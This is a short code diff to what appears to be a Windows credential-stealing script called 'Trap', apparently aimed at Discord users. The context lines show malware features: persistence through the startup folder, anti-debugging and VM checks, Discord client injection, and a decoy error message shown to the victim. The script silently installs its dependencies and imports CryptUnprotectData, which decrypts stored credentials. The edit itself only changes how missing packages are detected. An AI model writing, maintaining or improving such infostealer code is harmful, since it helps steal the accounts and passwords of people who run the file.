@@ -31,7 +31,6 @@ Startup = '%Startup%' # If True, adds the file to the startup folder
 antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
-import pkg_resources
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
@@ -41,8 +40,8 @@ requirements = [
 
 for modl in requirements:
     try:
-        dist = pkg_resources.get_distribution(modl[1])
-    except pkg_resources.DistributionNotFound:
+        __import__(modl[0])
+    except ImportError:
         subprocess.call(['pip', 'install', modl[1]])
         
 from win32crypt import CryptUnprotectData
